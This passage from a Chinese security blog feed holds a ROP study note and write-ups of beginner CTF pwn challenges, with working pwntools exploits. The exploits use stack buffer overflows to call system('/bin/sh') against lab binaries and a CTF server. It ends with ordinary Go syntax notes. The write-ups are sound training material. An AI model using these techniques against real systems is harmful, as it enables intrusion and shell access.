<span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">strcpy</span>(buf, argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input:%s\n&quot;</span>, buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用如下命令进行编译</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">gcc</span>-<span class="hljs-number">4</span>.<span class="hljs-number">8</span> -m<span class="hljs-number">32</span> -O<span class="hljs-number">0</span> -fno-stack-protector -o ROP ROP.c<br></code></pre></div></td></tr></table></figure><h3 id="编译参数说明"><a href="#编译参数说明" class="headerlink" title="编译参数说明"></a>编译参数说明</h3><ul><li>-m32：使用32位编译</li><li>-O0：关闭所有的优化</li><li>-g：在可执行文件中加入源码的信息</li><li>-fno-stack-protector：关闭栈保护</li><li>-z execstack：栈上代码可执行</li><li>-z norelro / -z relro -z lazy / -z relro -z now (关闭disabled / 部分开启Partial / 完全开启Full)</li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>使用IDA打开程序来看下，可以看到存在栈溢出，可以覆盖返回地址。</p><p><img src="/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/1.png"></p><p>现在我们需要getshell，所以要执行<code>system(/bin/sh)</code>，现在我们需要构造一个payload，覆盖栈之后刚好覆盖返回地址。但是在实际操作中，我发现我没办法像帖子一样实现，我找不到/bin/sh的地址，所以我自己减了难度，我在源码中定义了，system和/bin/sh。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">char</span> *sz = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    system();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>现在就可以开始实现，先搜索system地址</p><p><img src="/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/2.png"></p><p>查找/bin/sh地址</p><p><img src="/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/3.png"></p><p>开始构造payload，先输入140个a，看一下栈的空间，刚好到返回值地址。</p><p><img src="/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/4.png"></p><p>现在再来复习一下关于调用函数的时候栈的空间，调用函数的时候，栈的情况，首先是返回地址，然后是参数，依次参数n、参数n-1、参数n-2……参数1。</p><p>如图，此时只有一个参数</p><p><img src="https://b1ackie.cn/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/23.png"></p><p>所以现在payload是：140个字符（用来填充栈空间）+ system地址（覆盖返回值地址）+ 任意四个字节字符（system函数的返回地址）+ /bin/sh地址（system的参数）</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>构造的exp</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sysaddr = <span class="hljs-number">0x8048340</span><br>binaddr = <span class="hljs-number">0x8048570</span><br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">140</span> + p32(sysaddr) + <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">4</span> + p32(binaddr)<br><br>p = process(argv=[ <span class="hljs-string">&quot;/home/pwn/rop/1&quot;</span> , payload ] )<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>成功拿到shell</p><p><img src="/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/5.png"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ROP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界PWN-新手练习区</title>
    <link href="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <url>/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><p>查看文件，看到是64位文件，通过<code>checksec</code>可以查看保护的机制。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/1.png"></p><h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><p>保护机制这稍微介绍下</p><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p>主要是用来保护重定位段对应数据区域，默认可写</p><p>Partial RELRO表示got表不可写，got.plt可写</p><p>Full RELRO表示got表，got.plt不可写</p><h4 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h4><p>这主要是栈保护，canary意思是金丝雀，是栈保护，方式是在靠近栈底某个位置设置初值，防止栈溢出的一种保护。</p><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>数据执行保护，在windows上是DEP技术，基本原理是将数据所在的内存页表示为不可执行。</p><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>PIE保护就是基址随机化，每次加载时都会改变加载的基地址。</p><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用IDA打开，可以看到程序的流程，运行输出一串字符串之后就会调用<code>system(&quot;/bin/sh&quot;)</code>，会获得shell，不需要任何操作，只需要连接到远程主机就行了。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/2.png"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;59759&quot;</span>)<br>r.interactive()            <br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/3.png"></p><p>也可以直接nc到远程主机执行命令</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/4.png"></p><blockquote><p>cyberpeace{73b5fb2b3e5ef899ac9fe442ba8a3db6}</p></blockquote><h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>查看文件，可以看到是64位文件，只开启了NX保护，其他没有开启。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/5.png"></p><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用IDA打开分析，主要是要执行<code>sub_400686</code>函数，里面会查看flag，而进入此函数的要求就是<code>dword_60106C == 0x6E756161</code>，再看前面的<code>read</code>函数，读取了十个字节的数据，读取到<code>unk_601068</code>，而<code>dword_60106C</code>离它就差4个字节，也就是read读取的数据可以溢出到<code>dword_60106C</code>。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/6.png"></p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/7.png"></p><p>使用GDB调试看看</p><p>在<code>main</code>函数下断，调试到read处，然后输入<code>12345678</code>，再查看内存地址处的值来看下。看到<code>0x601068</code>处存放的是1234（ascii码，小端序），再看<code>0x60106c</code>处看到是5678，也就是输入的八个字符后四位成功溢出到了目标地址，现在只要这里等于0x6E756161就可以了。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/8.png"></p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/9.png"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">r</span> = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;63359&quot;</span>)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">4</span> + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">6</span>E<span class="hljs-number">756161</span>)<br><span class="hljs-attribute">r</span>.recvuntil(<span class="hljs-string">&quot;lets get helloworld for bof\n&quot;</span>)<br><span class="hljs-attribute">r</span>.sendline(payload)<br><span class="hljs-attribute">print</span>(r.recv())<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/10.png"></p><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>64位的文件，只开启了NX。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/11.png"></p><h3 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用IDA打开看main函数，看到<code>vulnerable_function</code>函数。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/12.png"></p><p>进入函数查看可以看到存在一个栈溢出，buf长度为128，read函数读取0x200。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/13.png"></p><p>现在找一下返回值覆盖的地方应该是什么，在函数中看到存在一个<code>callsystem</code>函数，查看可以看到可以获取shell，覆盖的返回地址为<code>callsystem</code>地址即可</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/14.png"></p><p>使用GDB调试一下，看看具体的栈空间变化，首先我们要清楚，在栈里，以这个为例子，栈底之前是缓冲区，栈底（RBP）是一个，栈底（RBP+8)再下面一个才是返回值地址，所以要覆盖返回地址的话，需要构造一共144个字符。</p><p>输入128个“a”，再输入一个“12345678”，再输入8个”c“，来查看下空间，看到当前RBP已经被12345678覆盖了，再往后一个地址是8个c。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/15.png"></p><p>执行到ret看下，看到返回地址是cccccccc</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/16.png"></p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">r</span> = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;59478&quot;</span>)<br><span class="hljs-attribute">addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400596</span><br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(addr)<br><span class="hljs-attribute">r</span>.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><span class="hljs-attribute">r</span>.send(payload)<br><span class="hljs-attribute">r</span>.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/17.png"></p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>32位的文件，保护只开启了NX</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/18.png"></p><p>根据题目的提示，简单的ROP，就是需要用到ROP技术，ROP就是Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过一些防御措施（比如内存不可执行）。我们可以使用libc库的函数，<code>system</code>，将函数返回地址指向<code>system</code>的地址。构造这样的</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-string">&quot;/bin/sh&quot;</span>)</span></span>；<br></code></pre></div></td></tr></table></figure><h3 id="详细分析-3"><a href="#详细分析-3" class="headerlink" title="详细分析"></a>详细分析</h3><p>主函数的流程很简单，看下<code>vulnerable_function</code>函数</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/19.png"></p><p>看到有<code>read</code>函数，可以读取0x100字节的数据，存在栈溢出，现在只需要覆盖返回地址覆盖到<code>system</code>函数地址，还需要构造”/bin/sh”</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/20.png"></p><p>在程序中已经存在了我们需要的两个东西。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/21.png"></p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/22.png"></p><p>现在再来复习一下关于调用函数的时候栈的空间，调用函数的时候，栈的情况，首先是返回地址，然后是参数，依次参数n、参数n-1、参数n-2……参数1。</p><p>如图，此时只有一个参数</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/23.png"></p><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">r</span> = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;50332&quot;</span>)<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">140</span>#覆盖buf加ebp<br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">8048320</span>)#覆盖返回地址<br><span class="hljs-attribute">payload</span> += <span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">4</span>#system的返回地址<br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">804</span>A<span class="hljs-number">024</span>)#/bin/sh的地址<br><span class="hljs-attribute">r</span>.sendline(payload)<br><span class="hljs-attribute">r</span>.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/24.png"></p>]]></content>
    
    
    <categories>
      
      <category>攻防世界writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go语言学习笔记一</title>
    <link href="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <url>/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="Go语言的结构"><a href="#Go语言的结构" class="headerlink" title="Go语言的结构"></a>Go语言的结构</h2><p>Go语言的基础组成有以下几部分</p><ul><li>包声明</li><li>引入包</li><li>函数</li><li>变量</li><li>语句&amp;表达式</li><li>注释</li></ul><p>写一个简单的代码，来看下大致的组成</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-comment">//定义了包名，每个程序都包含一个名为main的包</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-comment">//告诉GO编译器，这个程序使用了fmt的包</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-comment">//程序开始执行的函数</span><br>fmt.Printf(<span class="hljs-string">&quot;hello world !!!&quot;</span>)<br>    <span class="hljs-comment">//将字符串输出到控制台</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="执行Go程序"><a href="#执行Go程序" class="headerlink" title="执行Go程序"></a>执行Go程序</h2><p>打开编辑器，将上述代码写进去，保存为<code>.go</code>结尾的文件。</p><p>然后使用命令行，输入命令</p><blockquote><p>go run hello.go    </p></blockquote><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/1.png"></p><p>也可以将其编译成为可执行文件，使用命令</p><blockquote><p>go build hello.go</p></blockquote><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/2.png"></p><h2 id="Go基础语法"><a href="#Go基础语法" class="headerlink" title="Go基础语法"></a>Go基础语法</h2><h3 id="Go标记"><a href="#Go标记" class="headerlink" title="Go标记"></a>Go标记</h3><p>Go程序可以由多个标记组成，可以是关键字、标识符、常量、字符串、符号。</p><h3 id="行分隔符"><a href="#行分隔符" class="headerlink" title="行分隔符"></a>行分隔符</h3><p>在Go程序中，一行代表一个语句结束。每个语句不用像C那样以分号结尾，但是如果要将多个语句写在同一行，则必须使用分号，实际开发中，并不建议使用这种方法。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino">fmt.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>)<br>fmt.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;i am b1ackie&quot;</span>)<br></code></pre></div></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>注释是不会被编译的，可以使用单行注释和多行注释</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-comment">//这是单行注释</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">多行注释</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>标识符用来命名变量、类型等程序实体。一个标识符可以是一个或多个字母，数字，下划线组成的序列，但是第一个字符必须是字母或者下划线而不可以是数字。</p><p>以下这些是有效的标识符：</p><blockquote><p>bLackie    B1_ackie    _b1ackie</p></blockquote><p>这些是无效的标识符：</p><ul><li>1b1ackie（以数字开头）</li><li>case（GO语言的关键字）</li><li>a+b（运算符不允许）</li></ul><h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><p>Go语言的字符串可以通过<code>+</code>来实现</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;hello&quot;</span> + <span class="hljs-string">&quot;golang&quot;</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/3.png"></p><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>声明变量必须使用空格隔开</p><blockquote><p>var age int </p></blockquote><p>在变量与运算之间也加入空格，使得程序看起来更加的美观</p><blockquote><p>x = a + b</p></blockquote><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>go字符串格式化符号</p><table><thead><tr><th>格式</th><th>描述</th></tr></thead><tbody><tr><td>%v</td><td>按值的本来值输出</td></tr><tr><td>%+v</td><td>在%v的基础上，对结构体字段名和值进行展开</td></tr><tr><td>%#v</td><td>输出go语言语法格式的值</td></tr><tr><td>%T</td><td>输出go语言语法格式的类型和值</td></tr><tr><td>%%</td><td>输出%本体</td></tr><tr><td>%b</td><td>整型以二进制方式显示</td></tr><tr><td>%o</td><td>整型以八进制方式显示</td></tr><tr><td>%d</td><td>整型以十进制方式显示</td></tr><tr><td>%x</td><td>整型以十六进制方式显示</td></tr><tr><td>%X</td><td>整型以十六进制、字母大写方式显示</td></tr><tr><td>%U</td><td>Unicode字符</td></tr><tr><td>%f</td><td>浮点数</td></tr><tr><td>%p</td><td>指针、十六进制方式显示</td></tr></tbody></table><figure class="highlight swift"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs swift">package main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br>type point <span class="hljs-class"><span class="hljs-keyword">struct</span> </span>&#123;<br>x, y int<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span>()</span> &#123;<br>p :<span class="hljs-operator">=</span> point&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;<br><br><span class="hljs-comment">//输出结构体的对象值</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%v<span class="hljs-subst">\n</span>&quot;</span>, p)<br><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%+v<span class="hljs-subst">\n</span>&quot;</span>, p)<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%#v<span class="hljs-subst">\n</span>&quot;</span>, p)<br><br><span class="hljs-comment">//输出一个值得数据类型</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%T<span class="hljs-subst">\n</span>&quot;</span>, p)<br><br><span class="hljs-comment">//输出布尔类型</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%t<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-literal">false</span>)<br><br><span class="hljs-comment">//格式化整型，十进制来输出，%ld,%Ld长整型数据；%hd输出短整型</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%d<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">10</span>)<br><br><span class="hljs-comment">//二进制方式输出</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%b<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">10</span>)<br><br><span class="hljs-comment">//输出数值所对应的ascii字符</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%c<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">0x39</span>)<br><br><span class="hljs-comment">//十六进制方式输出</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%x<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">10</span>)<br><br><span class="hljs-comment">//输出浮点型数值</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%f<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">10.123</span>)<br><br><span class="hljs-comment">//科学计数法</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%e<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">123400000.0</span>)<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%E<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">123400000.0</span>)<br><br><span class="hljs-comment">//输出基本的字符串</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%s<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-string">&quot;<span 